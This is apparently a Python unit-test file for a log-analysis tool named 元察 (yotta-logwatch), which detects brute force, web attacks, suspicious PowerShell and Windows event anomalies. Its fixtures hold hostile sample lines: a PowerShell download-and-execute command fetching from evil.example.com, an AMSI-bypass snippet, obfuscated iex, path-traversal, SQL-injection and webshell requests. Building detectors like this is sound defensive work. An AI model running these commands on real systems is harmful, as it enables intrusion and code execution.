#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""yotta-logwatch（元察）单元测试。

运行：python -m unittest scripts.test_yotta_logwatch -v
或：  python scripts/test_yotta_logwatch.py
"""

import io
import json
import os
import sys
import tempfile
import unittest
from datetime import datetime, timedelta

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import yotta_logwatch as yl


# 测试用样本
AUTH_FAIL_1 = ("Jan  5 12:00:01 host sshd[100]: Failed password for root "
               "from 203.0.113.5 port 50000 ssh2")
AUTH_FAIL_2 = ("Jan  5 12:00:02 host sshd[101]: Failed password for root "
               "from 203.0.113.5 port 50001 ssh2")
AUTH_FAIL_3 = ("Jan  5 12:00:03 host sshd[102]: Failed password for admin "
               "from 203.0.113.5 port 50002 ssh2")
AUTH_OK = ("Jan  5 12:00:04 host sshd[103]: Accepted password for root "
           "from 203.0.113.5 port 50003 ssh2")
AUTH_SUDO = ("Jan  5 12:00:05 host sudo: root : TTY=pts/0 ; USER=root ; "
             "COMMAND=/bin/bash")
AUTH_NOTSUDO = ("Jan  5 12:00:06 host sudo: pam_unix(sudo:auth): "
                "authentication failure; user=alice not in sudoers")

WEB_TRAVERSAL = ('10.0.0.9 - - [05/Jan/2026:12:00:01 +0000] '
                 '"GET /../../etc/passwd HTTP/1.1" 404 123 "-" "curl/7.64"')
WEB_SQLI = ('10.0.0.9 - - [05/Jan/2026:12:00:02 +0000] '
            '"GET /index.php?id=1%20union%20select HTTP/1.1" 200 123 '
            '"-" "Mozilla/5.0"')
WEB_SHELL = ('10.0.0.9 - - [05/Jan/2026:12:00:03 +0000] '
             '"POST /shell.php?cmd=id HTTP/1.1" 200 123 "-" "curl/7.64"')
WEB_SQLMAP = ('10.0.0.9 - - [05/Jan/2026:12:00:00 +0000] '
              '"GET /wp-login.php HTTP/1.1" 404 123 "-" "sqlmap/1.5"')

PS_ENCODED = ('2026-08-27T12:00:00 powershell: CommandInvocation(-EncodedCommand): '
              'powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA')
PS_DOWNLOAD = ('2026-08-27T12:00:01 powershell: Invoke-WebRequest '
               'http://evil.example.com/a.ps1; Invoke-Expression (Get-Content a.ps1)')
PS_REFLECT = ('2026-08-27T12:00:02 powershell: Add-Type -AssemblyName '
              'System.Management.Automation; [Reflection.Assembly]::Load')
PS_AMSI = ('2026-08-27T12:00:03 powershell: '
           '[Ref]::Assembly.Load([Ref]::Assembly.GetType("System.Management.Automation.AmsiUtils"))')
PS_OBS = ('2026-08-27T12:00:04 powershell: iex ([char]105+[char]101+[char]120)')

# Windows 事件日志样例（key=value / wevtutil 文本 / XML 单行导出形态）
WINEVT_4625 = ("EventID=4625 ProviderName=Microsoft-Windows-Security-Auditing LogName=Security "
               "TimeCreated=2026-08-27T12:00:01.000Z EventRecordID=101 "
               "TargetUserName=admin WorkstationName=WS01 IpAddress=203.0.113.5 "
               "LogonType=3 An account failed to log on")
WINEVT_4625_ROOT = ("EventID=4625 ProviderName=Microsoft-Windows-Security-Auditing LogName=Security "
                    "TimeCreated=2026-08-27T12:00:02.000Z EventRecordID=102 "
                    "TargetUserName=root WorkstationName=WS01 IpAddress=203.0.113.5 "
                    "LogonType=3 An account failed to log on")
WINEVT_4625_B = ("EventID=4625 ProviderName=Microsoft-Windows-Security-Auditing LogName=Security "
                 "TimeCreated=2026-08-27T12:00:03.000Z EventRecordID=103 "
                 "TargetUserName=admin WorkstationName=WS01 IpAddress=203.0.113.5 "
                 "LogonType=3 An account failed to log on")
WINEVT_4624 = ("EventID=4624 ProviderName=Microsoft-Windows-Security-Auditing LogName=Security "
               "TimeCreated=2026-08-27T12:00:05.000Z EventRecordID=104 "
               "TargetUserName=admin WorkstationName=WS01 IpAddress=203.0.113.5 "
               "LogonType=10 An account was successfully logged on")
WINEVT_4720 = ("EventID=4720 ProviderName=Microsoft-Windows-Security-Auditing LogName=Security "
               "TimeCreated=2026-08-27T12:00:06.000Z EventRecordID=105 "
               "TargetUserName=backdoor A user account was created")
WINEVT_1102 = ("EventID=1102 ProviderName=Microsoft-Windows-Eventlog LogName=Security "
               "TimeCreated=2026-08-27T12:00:07.000Z EventRecordID=106 "
               "The audit log was cleared")
WINEVT_4688 = ("EventID=4688 ProviderName=Microsoft-Windows-Security-Auditing LogName=Security "
               "TimeCreated=2026-08-27T12:00:08.000Z EventRecordID=107 "
               "NewProcessName=C:\\Windows\\System32\\cmd.exe "
               "CommandLine=cmd /c whoami")
WINEVT_7045 = ("EventID=7045 ProviderName=Service Control Manager LogName=System "
               "TimeCreated=2026-08-27T12:00:09.000Z EventRecordID=108 "
               "ServiceName=EvilSvc A service was installed in the system")
WINEVT_4698 = ("EventID=4698 ProviderName=Microsoft-Windows-Security-Auditing LogName=Security "
               "TimeCreated=2026-08-27T12:00:10.000Z EventRecordID=109 "
               "TaskName=\\evil A scheduled task was created")
WINEVT_4740 = ("EventID=4740 ProviderName=Microsoft-Windows-Security-Auditing LogName=Security "
               "TimeCreated=2026-08-27T12:00:11.000Z EventRecordID=110 "
               "TargetUserName=admin The user account was locked out")
WINEVT_4732 = ("EventID=4732 ProviderName=Microsoft-Windows-Security-Auditing LogName=Security "
               "TimeCreated=2026-08-27T12:00:12.000Z EventRecordID=111 "
               "TargetUserName=backdoor GroupName=Administrators "
               "A member was added to a security-enabled local group")
WINEVT_XML = ('<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>'
              '<Provider Name="Microsoft-Windows-Security-Auditing"/><EventID>4625</EventID>'
              '<TimeCreated SystemTime="2026-08-27T12:00:00.000Z"/></System>'
              '<EventData><Data Name="TargetUserName">admin</Data>'
              '<Data Name="WorkstationName">WS01</Data>'
              '<Data Name="IpAddress">203.0.113.5</Data></EventData></Event>')
WINEVT_TEXT = ("Log Name: Security  Source: Microsoft-Windows-Security-Auditing  "
               "Date: 2026-08-27T12:00:00.000Z  Event ID: 4625  "
               "Target User Name: admin  Source Network Address: 203.0.113.5")


def ev_of(line, kind=None, host="test"):
    return yl.parse_line(line, host, kind)


class TestTime(unittest.TestCase):
    def test_syslog_time(self):
        dt = yl.parse_syslog_time("Jan  5 12:00:01")
        self.assertIsNotNone(dt)
        self.assertEqual(dt.month, 1)
        self.assertEqual(dt.day, 5)
        self.assertEqual(dt.hour, 12)
        self.assertEqual(dt.minute, 0)

    def test_syslog_time_invalid(self):
        self.assertIsNone(yl.parse_syslog_time("not a date"))

    def test_web_time(self):
        dt = yl.parse_web_time("05/Jan/2026:12:00:01 +0000")
        self.assertIsNotNone(dt)
        self.assertEqual(dt.year, 2026)
        self.assertEqual(dt.month, 1)
        self.assertEqual(dt.day, 5)

    def test_iso_time(self):
        dt = yl.parse_iso_time("2026-08-27T12:00:01")
        self.assertIsNotNone(dt)
        self.assertEqual(dt.year, 2026)
        self.assertEqual(dt.month, 8)


class TestSniff(unittest.TestCase):
    def test_sniff_auth(self):
        self.assertEqual(yl.sniff_type(AUTH_FAIL_1), yl.KIND_AUTH)

    def test_sniff_web(self):
        self.assertEqual(yl.sniff_type(WEB_TRAVERSAL), yl.KIND_WEB)

    def test_sniff_powershell(self):
        self.assertEqual(yl.sniff_type(PS_ENCODED), yl.KIND_POWERSHELL)

    def test_sniff_unknown(self):
        self.assertIsNone(yl.sniff_type("hello world"))


class TestSniffWinevt(unittest.TestCase):
    def test_sniff_winevt_keyvalue(self):
        self.assertEqual(yl.sniff_type(WINEVT_4625), yl.KIND_WINEVT)

    def test_sniff_winevt_xml(self):
        self.assertEqual(yl.sniff_type(WINEVT_XML), yl.KIND_WINEVT)

    def test_sniff_winevt_wevtutil_text(self):
        self.assertEqual(yl.sniff_type(WINEVT_TEXT), yl.KIND_WINEVT)

    def test_sniff_powershell_not_winevt(self):
        # PowerShell 脚本块行优先保持 powershell 类，不被事件日志嗅探抢走
        self.assertEqual(yl.sniff_type(PS_ENCODED), yl.KIND_POWERSHELL)


class TestParseAuth(unittest.TestCase):
    def test_failed_password(self):
        ev = ev_of(AUTH_FAIL_1)
        self.assertEqual(ev["kind"], yl.KIND_AUTH)
        self.assertEqual(ev["outcome"], "failed")
        self.assertEqual(ev["source"], "203.0.113.5")
        self.assertEqual(ev["user"], "root")

    def test_success(self):
        ev = ev_of(AUTH_OK)
        self.assertEqual(ev["outcome"], "success")
        self.assertEqual(ev["source"], "203.0.113.5")
        self.assertEqual(ev["user"], "root")

    def test_sudo(self):
        ev = ev_of(AUTH_SUDO)
        self.assertEqual(ev["kind"], yl.KIND_AUTH)
        self.assertIn("sudo", ev["message"].lower())

    def test_invalid_user(self):
        ev = ev_of(("Jan  5 12:00:07 host sshd[104]: Failed password for "
                    "invalid user nobody from 10.1.1.1 port 1234 ssh2"))
        self.assertEqual(ev["outcome"], "failed")
        self.assertEqual(ev["user"], "nobody")


class TestParseWeb(unittest.TestCase):
    def test_combined(self):
        ev = ev_of(WEB_SQLMAP)
        self.assertEqual(ev["kind"], yl.KIND_WEB)
        self.assertEqual(ev["source"], "10.0.0.9")
        self.assertEqual(ev["method"], "GET")
        self.assertEqual(ev["uri"], "/wp-login.php")
        self.assertEqual(ev["status"], 404)
        self.assertEqual(ev["ua"], "sqlmap/1.5")


class TestParsePowerShell(unittest.TestCase):
    def test_encoded(self):
        ev = ev_of(PS_ENCODED, kind=yl.KIND_POWERSHELL)
        self.assertEqual(ev["kind"], yl.KIND_POWERSHELL)
        self.assertIn("EncodedCommand", ev["message"])


class TestParseWinevt(unittest.TestCase):
    def test_parse_keyvalue(self):
        ev = ev_of(WINEVT_4625)
        self.assertEqual(ev["kind"], yl.KIND_WINEVT)
        self.assertEqual(ev["event_id"], 4625)
        self.assertEqual(ev["provider"], "Microsoft-Windows-Security-Auditing")
        self.assertEqual(ev["source"], "203.0.113.5")
        self.assertEqual(ev["user"], "admin")
        self.assertEqual(ev["workstation"], "WS01")
        self.assertEqual(ev["logon_type"], 3)
        self.assertEqual(ev["outcome"], "failed")
        self.assertIsNotNone(ev["ts"])

    def test_parse_xml(self):
        ev = ev_of(WINEVT_XML)
        self.assertEqual(ev["kind"], yl.KIND_WINEVT)
        self.assertEqual(ev["event_id"], 4625)
        self.assertEqual(ev["provider"], "Microsoft-Windows-Security-Auditing")
        self.assertEqual(ev["user"], "admin")
        self.assertEqual(ev["source"], "203.0.113.5")
        self.assertEqual(ev["workstation"], "WS01")

    def test_parse_wevtutil_text(self):
        ev = ev_of(WINEVT_TEXT)
        self.assertEqual(ev["kind"], yl.KIND_WINEVT)
        self.assertEqual(ev["event_id"], 4625)
        self.assertEqual(ev["provider"], "Microsoft-Windows-Security-Auditing")
        self.assertEqual(ev["user"], "admin")
        self.assertEqual(ev["source"], "203.0.113.5")

    def test_parse_4624_success(self):
        ev = ev_of(WINEVT_4624)
        self.assertEqual(ev["outcome"], "success")
        self.assertEqual(ev["logon_type"], 10)


class TestDetectAuth(unittest.TestCase):
    def test_brute_force(self):
        events = [ev_of(AUTH_FAIL_1), ev_of(AUTH_FAIL_2), ev_of(AUTH_FAIL_3),
                  ev_of(AUTH_FAIL_1), ev_of(AUTH_FAIL_2), ev_of(AUTH_FAIL_3)]
        findings = yl.detect_auth(events, window=300, max_fail=5)
        types = {f["type"] for f in findings}
        self.assertIn("brute_force", types)

    def test_credential_stuffing(self):
        events = [ev_of(AUTH_FAIL_1), ev_of(AUTH_FAIL_2), ev_of(AUTH_FAIL_3)]
        findings = yl.detect_auth(events, window=300, max_fail=100)
        types = {f["type"] for f in findings}
        self.assertIn("credential_stuffing", types)

    def test_abnormal_login(self):
        events = [ev_of(AUTH_FAIL_1), ev_of(AUTH_OK)]
        findings = yl.detect_auth(events, window=300, max_fail=100)
        types = {f["type"] for f in findings}
        self.assertIn("abnormal_login", types)

    def test_root_login(self):
        findings = yl.detect_auth([ev_of(AUTH_OK)], window=300, max_fail=100)
        types = {f["type"] for f in findings}
        self.assertIn("root_login", types)

    def test_sudo_escalation(self):
        findings = yl.detect_auth([ev_of(AUTH_SUDO)], window=300, max_fail=100)
        types = {f["type"] for f in findings}
        self.assertIn("sudo_escalation", types)

    def test_invalid_user(self):
        findings = yl.detect_auth([ev_of(AUTH_NOTSUDO)], window=300, max_fail=100)
        self.assertTrue(findings)


class TestDetectWeb(unittest.TestCase):
    def test_path_traversal(self):
        findings = yl.detect_web([ev_of(WEB_TRAVERSAL)])
        types = {f["type"] for f in findings}
        self.assertIn("path_traversal", types)

    def test_sqli(self):
        findings = yl.detect_web([ev_of(WEB_SQLI)])
        types = {f["type"] for f in findings}
        self.assertIn("sql_injection", types)

    def test_webshell(self):
        findings = yl.detect_web([ev_of(WEB_SHELL)])
        types = {f["type"] for f in findings}
        self.assertIn("webshell_upload", types)

    def test_suspicious_ua(self):
        findings = yl.detect_web([ev_of(WEB_SQLMAP)])
        types = {f["type"] for f in findings}
        self.assertIn("suspicious_ua", types)

    def test_scanner_signature(self):
        lines = []
        for i in range(3):
            lines.append('10.0.0.9 - - [05/Jan/2026:12:00:0%d +0000] '
                         '"GET /wp-login.php HTTP/1.1" 404 1 "-" "-"' % i)
        findings = yl.detect_web([ev_of(l) for l in lines])
        types = {f["type"] for f in findings}
        self.assertIn("scanner_signature", types)

    def test_flood_404(self):
        lines = []
        for i in range(25):
            lines.append('10.0.0.9 - - [05/Jan/2026:12:00:%02d +0000] '
                         '"GET /foo%d HTTP/1.1" 404 1 "-" "-"' % (i % 60, i))
        findings = yl.detect_web([ev_of(l) for l in lines], threshold_404=20)
        types = {f["type"] for f in findings}
        self.assertIn("flood_404", types)


class TestDetectPowerShell(unittest.TestCase):
    def test_encoded(self):
        findings = yl.detect_powershell([ev_of(PS_ENCODED, kind=yl.KIND_POWERSHELL)])
        types = {f["type"] for f in findings}
        self.assertIn("encoded_command", types)

    def test_download_execute(self):
        findings = yl.detect_powershell([ev_of(PS_DOWNLOAD, kind=yl.KIND_POWERSHELL)])
        types = {f["type"] for f in findings}
        self.assertIn("download_execute", types)

    def test_reflection(self):
        findings = yl.detect_powershell([ev_of(PS_REFLECT, kind=yl.KIND_POWERSHELL)])
        types = {f["type"] for f in findings}
        self.assertIn("reflection", types)

    def test_amsi(self):
        findings = yl.detect_powershell([ev_of(PS_AMSI, kind=yl.KIND_POWERSHELL)])
        types = {f["type"] for f in findings}
        self.assertIn("amsi_bypass", types)

    def test_obfuscation(self):
        findings = yl.detect_powershell([ev_of(PS_OBS, kind=yl.KIND_POWERSHELL)])
        types = {f["type"] for f in findings}
        self.assertIn("obfuscation", types)


class TestDetectWinevt(unittest.TestCase):
    def test_brute_force(self):
        evs = [ev_of(WINEVT_4625), ev_of(WINEVT_4625_ROOT), ev_of(WINEVT_4625_B)]
        findings = yl.detect_winevt(evs, window=300, max_fail=3)
        types = {f["type"] for f in findings}
        self.assertIn("brute_force", types)

    def test_credential_stuffing(self):
        evs = [ev_of(WINEVT_4625), ev_of(WINEVT_4625_ROOT)]
        findings = yl.detect_winevt(evs, window=300, max_fail=5)
        types = {f["type"] for f in findings}
        self.assertIn("credential_stuffing", types)

    def test_rdp_logon(self):
        findings = yl.detect_winevt([ev_of(WINEVT_4624)])
        types = {f["type"] for f in findings}
        self.assertIn("rdp_logon", types)

    def test_admin_logon(self):
        line = WINEVT_4624.replace("TargetUserName=admin",
                                   "TargetUserName=Administrator")
        findings = yl.detect_winevt([ev_of(line)])
        types = {f["type"] for f in findings}
        self.assertIn("admin_logon", types)

    def test_abnormal_login(self):
        evs = [ev_of(WINEVT_4625), ev_of(WINEVT_4624)]
        findings = yl.detect_winevt(evs, window=300, max_fail=5)
        types = {f["type"] for f in findings}
        self.assertIn("abnormal_login", types)

    def test_account_created(self):
        findings = yl.detect_winevt([ev_of(WINEVT_4720)])
        types = {f["type"] for f in findings}
        self.assertIn("account_created", types)

    def test_audit_log_cleared(self):
        findings = yl.detect_winevt([ev_of(WINEVT_1102)])
        types = {f["type"] for f in findings}
        self.assertIn("audit_log_cleared", types)

    def test_suspicious_process(self):
        findings = yl.detect_winevt([ev_of(WINEVT_4688)])
        types = {f["type"] for f in findings}
        self.assertIn("suspicious_process", types)

    def test_service_installed(self):
        findings = yl.detect_winevt([ev_of(WINEVT_7045)])
        types = {f["type"] for f in findings}
        self.assertIn("service_installed", types)

    def test_task_created(self):
        findings = yl.detect_winevt([ev_of(WINEVT_4698)])
        types = {f["type"] for f in findings}
        self.assertIn("task_created", types)

    def test_account_locked(self):
        findings = yl.detect_winevt([ev_of(WINEVT_4740)])
        types = {f["type"] for f in findings}
        self.assertIn("account_locked", types)

    def test_group_member_add_admin(self):
        findings = yl.detect_winevt([ev_of(WINEVT_4732)])
        f = [x for x in findings if x["type"] == "group_member_add"][0]
        self.assertEqual(f["severity"], "high")


class TestPipeline(unittest.TestCase):
    def test_parse_events_mixed(self):
        lines = [AUTH_FAIL_1, WEB_TRAVERSAL, PS_ENCODED]
        events = list(yl.parse_events(lines, "test"))
        kinds = {e["kind"] for e in events}
        self.assertEqual(kinds, {yl.KIND_AUTH, yl.KIND_WEB, yl.KIND_POWERSHELL})

    def test_parse_events_mixed_winevt(self):
        lines = [AUTH_FAIL_1, WINEVT_4625, PS_ENCODED]
        events = list(yl.parse_events(lines, "test"))
        kinds = {e["kind"] for e in events}
        self.assertEqual(kinds, {yl.KIND_AUTH, yl.KIND_WINEVT, yl.KIND_POWERSHELL})

    def test_run_detections_and_dedupe(self):
        lines = [AUTH_FAIL_1, AUTH_FAIL_2, AUTH_FAIL_3, AUTH_FAIL_1,
                 AUTH_FAIL_2, AUTH_FAIL_3]
        events = list(yl.parse_events(lines, "test"))
        findings = yl.run_detections(events, {"window": 300, "max_fail": 5,
                                              "threshold_404": 20})
        self.assertTrue(findings)
        ids = [f["id"] for f in findings]
        self.assertEqual(len(ids), len(set(ids)))

    def test_build_timeline_sorted(self):
        findings = [yl._make_finding("web", "x", "low", "a", "d", time_value=None),
                    yl._make_finding("web", "y", "low", "b", "d",
                                     time_value=datetime(2026, 1, 1, 0, 0, 1)),
                    ]
        tl = yl.build_timeline(findings)
        # 有时间的排在前面
        self.assertIsNotNone(tl[0]["time"])


class TestOutput(unittest.TestCase):
    def test_format_text(self):
        f = yl._make_finding("auth", "brute_force", "high", "爆破", "描述",
                             evidence=["line1"], source="1.2.3.4", count=9)
        text = yl.format_text([f], {"events": 3, "inputs": ["a.log"]},
                              {"generated_at": "2026-08-27T00:00:00"})
        self.assertIn("元察", text)
        self.assertIn("爆破", text)
        self.assertIn("HIGH", text)

    def test_format_md(self):
        f = yl._make_finding("auth", "brute_force", "high", "爆破", "描述")
        md = yl.format_md([f], {"events": 3, "inputs": ["a.log"]},
                          {"generated_at": "2026-08-27T00:00:00"})
        self.assertIn("# 元察", md)
        self.assertIn("爆破", md)

    def test_build_json(self):
        f = yl._make_finding("auth", "brute_force", "high", "爆破", "描述")
        payload = yl.build_json([f], {"events": 3, "inputs": ["a.log"]},
                                {"generated_at": "2026-08-27T00:00:00"})
        self.assertEqual(payload["tool"], yl.TOOL)
        self.assertEqual(payload["version"], yl.VERSION)
        self.assertEqual(payload["stats"]["findings"], 1)
        self.assertEqual(payload["findings"][0]["type"], "brute_force")

    def test_format_text_winevt_fields(self):
        f = yl._make_finding("winevt", "audit_log_cleared", "critical", "日志清空", "描述",
                             evidence=["line"], event_id=1102,
                             provider="Microsoft-Windows-Eventlog", workstation="WS01")
        text = yl.format_text([f], {"events": 1, "inputs": ["a.log"]},
                              {"generated_at": "2026-08-27T00:00:00"})
        self.assertIn("EventID: 1102", text)
        self.assertIn("Microsoft-Windows-Eventlog", text)
        self.assertIn("WS01", text)

    def test_format_md_winevt_fields(self):
        f = yl._make_finding("winevt", "audit_log_cleared", "critical", "日志清空", "描述",
                             evidence=["line"], event_id=1102)
        md = yl.format_md([f], {"events": 1, "inputs": ["a.log"]},
                          {"generated_at": "2026-08-27T00:00:00"})
        self.assertIn("EventID：1102", md)


class TestCLI(unittest.TestCase):
    def test_version(self):
        with self.assertRaises(SystemExit) as cm:
            yl.main(["--version"])
        self.assertEqual(cm.exception.code, 0)

    def test_scan_no_findings(self):
        with tempfile.NamedTemporaryFile("w", suffix=".log", delete=False,
                                         encoding="utf-8", newline="") as tf:
            tf.write("hello world\n")
            path = tf.name
        try:
            code = yl.main(["scan", "--path", path])
            self.assertEqual(code, 0)
        finally:
            os.unlink(path)

    def test_scan_findings(self):
        lines = []
        for i in range(8):
            lines.append("Jan  5 12:00:%02d host sshd[%d]: Failed password "
                         "for root from 203.0.113.5 port %d ssh2" % (i, i, 50000 + i))
        suffix = ".log"
        with tempfile.NamedTemporaryFile("w", suffix=suffix, delete=False,
                                         encoding="utf-8", newline="") as tf:
            tf.write("\n".join(lines) + "\n")
            path = tf.name
        try:
            code = yl.main(["scan", "--path", path])
            self.assertEqual(code, 1)
        finally:
            os.unlink(path)

    def test_scan_missing_path(self):
        code = yl.main(["scan", "--path", "C:/nonexistent/does_not_exist.log"])
        self.assertEqual(code, 4)

    def test_scan_json(self):
        lines = [WEB_SHELL]
        with tempfile.NamedTemporaryFile("w", suffix=".log", delete=False,
                                         encoding="utf-8", newline="") as tf:
            tf.write("\n".join(lines) + "\n")
            path = tf.name
        try:
            code = yl.main(["scan", "--path", path, "--format", "json"])
            self.assertEqual(code, 1)
        finally:
            os.unlink(path)


    def test_scan_winevt_type(self):
        with tempfile.NamedTemporaryFile("w", suffix=".log", delete=False,
                                         encoding="utf-8", newline="") as tf:
            tf.write(WINEVT_1102 + "\n")
            path = tf.name
        try:
            code = yl.main(["scan", "--path", path, "--type", "winevt"])
            self.assertEqual(code, 1)
        finally:
            os.unlink(path)


if __name__ == "__main__":
    unittest.main(verbosity=2)
